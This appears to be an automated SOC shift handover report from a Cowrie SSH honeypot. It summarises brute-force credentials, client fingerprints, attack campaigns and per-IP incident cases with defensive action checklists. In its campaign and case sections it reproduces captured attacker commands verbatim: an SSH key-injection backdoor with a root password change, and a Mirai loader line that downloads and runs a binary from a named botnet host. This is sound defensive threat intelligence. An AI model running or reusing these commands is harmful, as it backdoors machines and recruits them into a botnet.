# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-05 |
| **Generated At** | 2026-11-05T19:15:08Z |
| **Shift Time** | 19:15 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **417** |
| Confirmed Threats | **340** |
| False Positives Filtered | **77** (18.5%) |
| Unique Attacker IPs | **218** |
| Countries of Origin | **44** |
| High Severity Cases | **217** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **200** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3124** |
| Unique Credential Pairs | **1509** |
| Unique Usernames | **557** |
| Unique Passwords | **1033** |
| Successful Auth Pairs | **2851** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1010 |
| `admin` | 102 |
| `rootssssss23424123123` | 95 |
| `ubuntu` | 88 |
| `user` | 55 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 152 |
| `rootssssss23424123123` | 95 |
| `root3245gs5662d34111111111` | 95 |
| `123` | 89 |
| `1234` | 67 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 95 |
| `root` | `root3245gs5662d34111111111` | 30 |
| `root` | `` | 29 |
| `support` | `support` | 29 |
| `admin` | `admin` | 26 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `54.39.20.127` | 2026-11-05T03:08:06 |
| `rootssssss23424123123` | `rootssssss23424123123` | `54.39.20.127` | 2026-11-05T03:08:07 |
| `admin` | `root3245gs5662d34111111111` | `54.39.20.127` | 2026-11-05T03:08:13 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.149.182` | 2026-11-05T03:10:37 |
| `root` | `warzone` | `10.0.0.73` | 2026-11-05T03:15:35 |
| `root` | `daniel90` | `10.0.0.73` | 2026-11-05T03:17:00 |
| `root` | `12051984` | `10.0.0.73` | 2026-11-05T03:22:05 |
| `mc` | `123` | `10.0.0.73` | 2026-11-05T03:28:28 |
| `root` | `proxmox` | `10.0.0.73` | 2026-11-05T03:34:00 |
| `neo` | `neo` | `10.0.0.73` | 2026-11-05T03:34:05 |
| `rootssssss23424123123` | `rootssssss23424123123` | `10.0.0.73` | 2026-11-05T03:34:07 |
| `neo` | `root3245gs5662d34111111111` | `10.0.0.73` | 2026-11-05T03:34:14 |
| `root` | `enternow` | `10.0.0.73` | 2026-11-05T03:35:28 |
| `root` | `Shell` | `10.0.0.73` | 2026-11-05T03:42:19 |
| `support` | `support` | `10.0.0.73` | 2026-11-05T03:42:43 |
| `admin` | `admin` | `138.226.239.234` | 2026-11-05T03:44:56 |
| `operator` | `123` | `10.0.0.73` | 2026-11-05T03:46:47 |
| `root` | `Qwer1234!@#$` | `10.0.0.73` | 2026-11-05T03:47:46 |
| `root` | `root3245gs5662d34111111111` | `10.0.0.73` | 2026-11-05T03:47:55 |
| `support` | `support` | `176.53.159.196` | 2026-11-05T03:48:47 |
_… 2831 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **417** |
| Sessions with Fingerprint | **28** |
| Unique HASSH Fingerprints | **28** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 121 |
| Go SSH scanner | 107 |
| OpenSSH | 10 |
| Unknown | 4 |
| PuTTY | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 81 | 44 |
| `2ec37a7cc8da...` | Mirai/variant | 68 | 4 |
| `03a80b21afa8...` | Modern SSH client | 9 | 5 |
| `f1e5e9d24e5e...` | Mirai/variant | 8 | 1 |
| `eff4c24daffc...` | Modern SSH client | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 81 | 44 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 68 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 23 | 15 | — |
| `03a80b21afa8...` | libssh | 9 | 5 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 8 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 6 | 3 | Generic scanner |
| `390ffe68a68c...` | OpenSSH | 5 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **84** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 66 | 40 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:tnkcNnrI9mSx"|chpasswd|bash
```
```
w
```
Source IPs: `119.167.206.194`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.178.16.179`, `49.0.87.123`, `103.189.89.145`, `103.98.176.164`, `103.146.52.157`, `181.191.194.175`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://phubotnet.duckdns.org/main_mips -O main_mips || busybox wget http://phubotnet.duckdns.org/main_mips -O main_mips || curl -O http://phubotnet.duckdns.org/main_mips; busybox chmod 777 main_mips; chmod 777 main_mips; ./main_mips telnet &; rm -rf main_mips
```
Source IPs: `222.119.52.71`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **218** |
| Unique ASNs | **98** |
| High-Risk ASNs | **73** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 54 | HIGH |
| `AS396982` | Google LLC | 8 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 7 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 7 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS398324` | Censys, Inc. | 6 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (206)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-813f82e556f7

| Field | Detail |
|---|---|
| **Source IP** | `54.39.20[.]127` |
| **First Seen** | 2026-11-05 03:08 |
| **Last Seen** | 2026-11-05 03:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 03:08:06` | `cowrie.session.connect` |
| `2026-11-05 03:08:06` | `cowrie.client.version` |
| `2026-11-05 03:08:06` | `cowrie.client.kex` |
| `2026-11-05 03:08:06` | `cowrie.login.success` |
| `2026-11-05 03:08:07` | `cowrie.session.params` |
| `2026-11-05 03:08:07` | `cowrie.command.input` |
| `2026-11-05 03:08:07` | `cowrie.command.failed` |
| `2026-11-05 03:08:07` | `cowrie.log.closed` |
| `2026-11-05 03:08:07` | `cowrie.session.params` |
| `2026-11-05 03:08:07` | `cowrie.command.input` |
| `2026-11-05 03:08:07` | `cowrie.session.file_download` |
| `2026-11-05 03:08:07` | `cowrie.log.closed` |
| `2026-11-05 03:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.39.20[.]127` to AbuseIPDB if not already reported
- [ ] Block `54.39.20[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8b9ea1914fa

| Field | Detail |
|---|---|
| **Source IP** | `54.39.20[.]127` |
| **First Seen** | 2026-11-05 03:08 |
| **Last Seen** | 2026-11-05 03:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 03:08:07` | `cowrie.session.connect` |
| `2026-11-05 03:08:07` | `cowrie.client.version` |
| `2026-11-05 03:08:07` | `cowrie.client.kex` |
| `2026-11-05 03:08:07` | `cowrie.login.success` |
| `2026-11-05 03:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.39.20[.]127` to AbuseIPDB if not already reported
- [ ] Block `54.39.20[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29fb89a41e5b

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-11-05 03:44 |
| **Last Seen** | 2026-11-05 03:45 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 03:44:56` | `cowrie.session.connect` |
| `2026-11-05 03:44:56` | `cowrie.client.version` |
| `2026-11-05 03:44:56` | `cowrie.client.kex` |
| `2026-11-05 03:44:56` | `cowrie.login.success` |
| `2026-11-05 03:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88ca723c3422

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-05 03:48 |
| **Last Seen** | 2026-11-05 03:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 03:48:46` | `cowrie.session.connect` |
| `2026-11-05 03:48:46` | `cowrie.client.version` |
| `2026-11-05 03:48:46` | `cowrie.client.kex` |
| `2026-11-05 03:48:47` | `cowrie.login.success` |
| `2026-11-05 03:48:47` | `cowrie.direct-tcpip.request` |
| `2026-11-05 03:48:47` | `cowrie.direct-tcpip.data` |
| `2026-11-05 03:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2a241fa27b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:00 |
| **Last Seen** | 2026-11-05 04:01 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7982e1aef8346eefbe00cbc6ee3cc1dc_small_control'"'"' '"'"'check_7982e1aef8346eefbe00cbc6ee3cc1dc'"'"'', printf '\n%s|%s\n' 'check_7982e1aef8346eefbe00cbc6ee3cc1dc_small_control' 'check_7982e1aef8346eefbe00cbc6ee3cc1dc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7982e1aef8346eefbe00cbc6ee3cc1dc_small_math'"'"' "$((200*297+67))"', (200*297+67, printf '\n%s|%s\n' 'check_7982e1aef8346eefbe00cbc6ee3cc1dc_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:00:35` | `cowrie.session.connect` |
| `2026-11-05 04:00:36` | `cowrie.client.version` |
| `2026-11-05 04:00:36` | `cowrie.client.kex` |
| `2026-11-05 04:00:39` | `cowrie.login.success` |
| `2026-11-05 04:00:41` | `cowrie.client.size` |
| `2026-11-05 04:00:42` | `cowrie.session.params` |
| `2026-11-05 04:00:42` | `cowrie.command.input` |
| `2026-11-05 04:00:42` | `cowrie.command.input` |
| `2026-11-05 04:00:42` | `cowrie.command.input` |
| `2026-11-05 04:00:42` | `cowrie.command.input` |
| `2026-11-05 04:00:42` | `cowrie.command.input` |
| `2026-11-05 04:00:42` | `cowrie.command.input` |
| `2026-11-05 04:00:42` | `cowrie.command.input` |
| `2026-11-05 04:00:42` | `cowrie.command.input` |
| `2026-11-05 04:00:42` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e203918968e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:02 |
| **Last Seen** | 2026-11-05 04:03 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bab7b36dac28d6ba5694385865a523db_small_control'"'"' '"'"'check_bab7b36dac28d6ba5694385865a523db'"'"'', printf '\n%s|%s\n' 'check_bab7b36dac28d6ba5694385865a523db_small_control' 'check_bab7b36dac28d6ba5694385865a523db', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bab7b36dac28d6ba5694385865a523db_small_math'"'"' "$((941*348+76))"', (941*348+76, printf '\n%s|%s\n' 'check_bab7b36dac28d6ba5694385865a523db_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:02:45` | `cowrie.session.connect` |
| `2026-11-05 04:02:46` | `cowrie.client.version` |
| `2026-11-05 04:02:46` | `cowrie.client.kex` |
| `2026-11-05 04:02:49` | `cowrie.login.success` |
| `2026-11-05 04:02:51` | `cowrie.client.size` |
| `2026-11-05 04:02:51` | `cowrie.session.params` |
| `2026-11-05 04:02:52` | `cowrie.command.input` |
| `2026-11-05 04:02:52` | `cowrie.command.input` |
| `2026-11-05 04:02:52` | `cowrie.command.input` |
| `2026-11-05 04:02:52` | `cowrie.command.input` |
| `2026-11-05 04:02:52` | `cowrie.command.input` |
| `2026-11-05 04:02:52` | `cowrie.command.input` |
| `2026-11-05 04:02:52` | `cowrie.command.input` |
| `2026-11-05 04:02:52` | `cowrie.command.input` |
| `2026-11-05 04:02:52` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab88d4700ab

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:04 |
| **Last Seen** | 2026-11-05 04:05 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9f4c60b4bad45883338fe0c0e570006e_small_control'"'"' '"'"'check_9f4c60b4bad45883338fe0c0e570006e'"'"'', printf '\n%s|%s\n' 'check_9f4c60b4bad45883338fe0c0e570006e_small_control' 'check_9f4c60b4bad45883338fe0c0e570006e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9f4c60b4bad45883338fe0c0e570006e_small_math'"'"' "$((901*973+41))"', (901*973+41, printf '\n%s|%s\n' 'check_9f4c60b4bad45883338fe0c0e570006e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:04:57` | `cowrie.session.connect` |
| `2026-11-05 04:04:58` | `cowrie.client.version` |
| `2026-11-05 04:04:58` | `cowrie.client.kex` |
| `2026-11-05 04:05:01` | `cowrie.login.success` |
| `2026-11-05 04:05:03` | `cowrie.client.size` |
| `2026-11-05 04:05:04` | `cowrie.session.params` |
| `2026-11-05 04:05:04` | `cowrie.command.input` |
| `2026-11-05 04:05:04` | `cowrie.command.input` |
| `2026-11-05 04:05:04` | `cowrie.command.input` |
| `2026-11-05 04:05:04` | `cowrie.command.input` |
| `2026-11-05 04:05:04` | `cowrie.command.input` |
| `2026-11-05 04:05:04` | `cowrie.command.input` |
| `2026-11-05 04:05:04` | `cowrie.command.input` |
| `2026-11-05 04:05:04` | `cowrie.command.input` |
| `2026-11-05 04:05:04` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-462725caaceb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:07 |
| **Last Seen** | 2026-11-05 04:07 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_50ac4645755a966eccf62b302093cb05_small_control'"'"' '"'"'check_50ac4645755a966eccf62b302093cb05'"'"'', printf '\n%s|%s\n' 'check_50ac4645755a966eccf62b302093cb05_small_control' 'check_50ac4645755a966eccf62b302093cb05', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_50ac4645755a966eccf62b302093cb05_small_math'"'"' "$((713*152+89))"', (713*152+89, printf '\n%s|%s\n' 'check_50ac4645755a966eccf62b302093cb05_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:07:11` | `cowrie.session.connect` |
| `2026-11-05 04:07:11` | `cowrie.client.version` |
| `2026-11-05 04:07:11` | `cowrie.client.kex` |
| `2026-11-05 04:07:13` | `cowrie.login.success` |
| `2026-11-05 04:07:15` | `cowrie.client.size` |
| `2026-11-05 04:07:16` | `cowrie.session.params` |
| `2026-11-05 04:07:17` | `cowrie.command.input` |
| `2026-11-05 04:07:17` | `cowrie.command.input` |
| `2026-11-05 04:07:17` | `cowrie.command.input` |
| `2026-11-05 04:07:17` | `cowrie.command.input` |
| `2026-11-05 04:07:17` | `cowrie.command.input` |
| `2026-11-05 04:07:17` | `cowrie.command.input` |
| `2026-11-05 04:07:17` | `cowrie.command.input` |
| `2026-11-05 04:07:17` | `cowrie.command.input` |
| `2026-11-05 04:07:17` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2edd5446ef1

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-11-05 04:08 |
| **Last Seen** | 2026-11-05 04:13 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:08:53` | `cowrie.session.connect` |
| `2026-11-05 04:08:53` | `cowrie.client.version` |
| `2026-11-05 04:08:54` | `cowrie.client.kex` |
| `2026-11-05 04:08:55` | `cowrie.login.success` |
| `2026-11-05 04:08:56` | `cowrie.session.params` |
| `2026-11-05 04:08:56` | `cowrie.command.input` |
| `2026-11-05 04:08:56` | `cowrie.command.failed` |
| `2026-11-05 04:08:56` | `cowrie.log.closed` |
| `2026-11-05 04:08:57` | `cowrie.session.params` |
| `2026-11-05 04:08:57` | `cowrie.command.input` |
| `2026-11-05 04:08:57` | `cowrie.session.file_download` |
| `2026-11-05 04:08:57` | `cowrie.log.closed` |
| `2026-11-05 04:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e68f0a97d1a7

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-11-05 04:10 |
| **Last Seen** | 2026-11-05 04:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:10:28` | `cowrie.session.connect` |
| `2026-11-05 04:10:28` | `cowrie.client.version` |
| `2026-11-05 04:10:28` | `cowrie.client.kex` |
| `2026-11-05 04:10:29` | `cowrie.login.success` |
| `2026-11-05 04:10:30` | `cowrie.session.params` |
| `2026-11-05 04:10:30` | `cowrie.command.input` |
| `2026-11-05 04:10:30` | `cowrie.command.failed` |
| `2026-11-05 04:10:31` | `cowrie.log.closed` |
| `2026-11-05 04:10:32` | `cowrie.session.params` |
| `2026-11-05 04:10:32` | `cowrie.command.input` |
| `2026-11-05 04:10:32` | `cowrie.session.file_download` |
| `2026-11-05 04:10:32` | `cowrie.log.closed` |
| `2026-11-05 04:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2b420b922f9

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-11-05 04:10 |
| **Last Seen** | 2026-11-05 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:10:32` | `cowrie.session.connect` |
| `2026-11-05 04:10:32` | `cowrie.client.version` |
| `2026-11-05 04:10:33` | `cowrie.client.kex` |
| `2026-11-05 04:10:34` | `cowrie.login.success` |
| `2026-11-05 04:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f8925ec4f6b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:11 |
